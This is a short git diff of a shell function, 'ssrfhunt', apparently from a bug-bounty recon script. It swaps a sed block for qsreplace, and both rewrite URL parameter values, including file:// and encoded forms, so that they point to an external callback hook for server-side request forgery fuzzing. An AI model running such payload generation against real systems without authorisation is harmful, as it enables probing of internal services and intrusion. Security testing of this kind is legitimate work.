@@ -12,26 +12,7 @@ ssrfhunt() {
 
   echo "[*] Injecting payloads into 4ssrf entries..."
 
-  cat 4ssrf | while read line; do
-    echo "$line" | sed -E "
-      s#=https://#=$hook#gI;
-      s#=http://#=$hook#gI;
-      s#=file:///+#=$hook#gI;
-      s#=/[a-zA-Z0-9._/-]+#=$hook#gI;
-      s#=[a-zA-Z0-9._/-]+#=$hook#gI;
-
-      # URL-encoded
-      s#=https%3A%2F%2F[^&\ ]*#=$encoded_hook#gI;
-      s#=http%3A%2F%2F[^&\ ]*#=$encoded_hook#gI;
-      s#=file%3A%2F%2F%2F[^&\ ]*#=$encoded_hook#gI;
-      s#=%2F[a-zA-Z0-9%._/-]+#=$encoded_hook#gI;
-      s#=[a-zA-Z0-9%._/-]+#=$encoded_hook#gI;
-
-      # hex-style encoded
-      s#=%66%69%6c%65%3a%2f%2f[^& ]*#=$encoded_hook#gI;
-      s#=%68%74%74%70%3a%2f%2f[^& ]*#=$encoded_hook#gI;
-    "
-  done > ssrf
+  cat 4ssrf | qsreplace "$encoded_hook" >ssrf
 
   echo "[+] Payloaded URLs saved to ssrf 💉"
   echo "[I] Run fuzz ssrf to fuzz em"
